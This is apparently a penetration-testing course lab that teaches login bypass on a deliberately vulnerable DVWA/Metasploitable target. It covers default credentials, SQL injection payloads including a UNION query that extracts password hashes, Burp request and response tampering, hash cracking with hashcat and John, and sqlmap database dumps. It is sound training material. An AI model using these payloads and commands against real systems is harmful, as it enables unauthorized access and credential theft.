# 🔬 Lab Exercise 3: User Login Bypass

> **Challenge:** Bypass login forms using SQLi, default creds, and response manipulation
> **Where:** DVWA on Metasploitable (`http://192.168.56.20/dvwa/`)
> **Time:** ~40-50 minutes

---

## Exercise 3A: Default Credentials on Metasploitable Services

**Task:** Try default credentials on various services running on Metasploitable.

### FTP (Port 21)
```bash
# Try default FTP credentials
ftp 192.168.56.20
# When prompted:
# Username: msfadmin
# Password: msfadmin
# ✅ EXPECTED: Login successful

# Try anonymous login
ftp 192.168.56.20
# Username: anonymous
# Password: (just press Enter)
# 📝 Did anonymous login work?
```

### SSH (Port 22)
```bash
# Try default credentials
ssh msfadmin@192.168.56.20
# Password: msfadmin
# ✅ EXPECTED: Login successful
exit
```

### DVWA Web Login
```bash
# Open Firefox: http://192.168.56.20/dvwa/login.php
# Try: admin / password
# ✅ EXPECTED: Login successful — this is the default!

# Try: admin / admin — does it work?
# Try: admin / 12345 — does it work?
# 📝 Document which credentials worked
```

### Tomcat (Port 8180)
```bash
# Open Firefox: http://192.168.56.20:8180/
# Click "Tomcat Manager" link
# Try: tomcat / tomcat
# ✅ EXPECTED: Access to Tomcat Manager!
```

---

## Exercise 3B: SQL Injection Login Bypass on DVWA

**Target:** DVWA SQL Injection page at `http://192.168.56.20/dvwa/vulnerabilities/sqli/`

> **Prerequisite:** Set DVWA security to **Low** at `http://192.168.56.20/dvwa/security.php`

### Step 1: Normal Query
```
1. Open http://192.168.56.20/dvwa/vulnerabilities/sqli/
2. Enter User ID: 1
3. Click Submit
4. ✅ EXPECTED: You see user info (ID, First name, Surname)
5. 📝 Note what data is returned
```

### Step 2: Test for SQL Injection
```
1. Enter User ID: 1'
2. Click Submit
3. ✅ EXPECTED: SQL error message — this confirms SQLi vulnerability!
4. 📝 Copy the error message — it reveals the backend database
```

### Step 3: Extract All Users
```
1. Enter User ID: ' OR '1'='1
2. Click Submit
3. ✅ EXPECTED: ALL users are displayed (not just user 1)
4. 📝 How many users were returned?
```

### Step 4: UNION-Based Extraction
```
1. Enter User ID: ' UNION SELECT user, password FROM users#
2. Click Submit
3. ✅ EXPECTED: Usernames and password HASHES are displayed!
4. 📝 Copy all the password hashes — you'll crack them next!
```

### Step 5: Crack the Extracted Hashes
```bash
# On Kali terminal, save the hashes you found:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/dvwa_hashes.txt
# Add more hashes from the UNION query, one per line

# Crack with hashcat (MD5)
hashcat -m 0 /tmp/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Or with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
john --format=raw-md5 --show /tmp/dvwa_hashes.txt
```

---

## Exercise 3C: SQLi Login Bypass with Burp Suite

**Target:** DVWA Login Page

### Step 1: Set Up Burp Proxy
```
1. Open Burp Suite (burpsuite &)
2. Go to Proxy → Intercept → Turn Intercept ON
3. In Kali Firefox → Settings → Network → Manual Proxy:
   - HTTP Proxy: 127.0.0.1, Port: 8080
   - Check "Also use this proxy for HTTPS"
4. Navigate to http://192.168.56.20/dvwa/login.php
```

### Step 2: Intercept a Login Request
```
1. Enter Username: admin' OR '1'='1' --
2. Enter Password: anything
3. Click Login
4. In Burp → you'll see the intercepted POST request
5. 📝 Look at the request body — find the username and password parameters
6. Click Forward to send it
7. ✅ EXPECTED: You're logged in! (If DVWA uses simple authentication)
```

### Step 3: Response Manipulation
```
1. Turn Intercept ON
2. In Burp: Action → Do intercept → Response to this request
3. Login with WRONG credentials: admin / wrongpassword
4. Forward the request
5. When you see the RESPONSE:
   - Look for redirects, error messages, or JSON responses
   - Try changing the Location header to /dvwa/index.php
   - Try changing any "fail" to "success" text
6. Forward the modified response
7. 📝 Did the manipulation work?
```

---

## Exercise 3D: Try SQLi at Medium Security Level

```
1. Go to http://192.168.56.20/dvwa/security.php
2. Change to "Medium"
3. Go back to SQLi page: http://192.168.56.20/dvwa/vulnerabilities/sqli/
4. Notice: The input is now a dropdown (no text field!)

# Use Burp to bypass:
1. Select any user ID from dropdown
2. Intercept the request in Burp
3. In the intercepted request, change the id parameter:
   id=1 → id=1 OR 1=1
4. Forward the request
5. ✅ EXPECTED: All users displayed again!
```

---

## Exercise 3E: Automated SQL Injection with sqlmap

```bash
# Step 1: Get your DVWA session cookie
# In Firefox, press F12 → Console → type: document.cookie
# Copy the PHPSESSID value

# Step 2: Run sqlmap against DVWA SQLi page
sqlmap -u "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dbs
# ✅ EXPECTED: sqlmap detects SQLi and lists databases (dvwa, information_schema, etc.)

# Step 3: Dump the DVWA users table
sqlmap -u "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa -T users --dump
# ✅ EXPECTED: All usernames and password hashes dumped!
```

---

## ✅ Completion Checklist

- [ ] Tested default credentials on FTP, SSH, DVWA, Tomcat (3A)
- [ ] Performed manual SQLi on DVWA — extracted data with UNION (3B)
- [ ] Used Burp Suite to intercept and modify login requests (3C)
- [ ] Bypassed Medium security with Burp parameter modification (3D)
- [ ] Used sqlmap for automated SQL injection (3E)

---

**Next:** [Challenge 4: Server Fingerprinting →](./04_lab_server_fingerprinting.md)
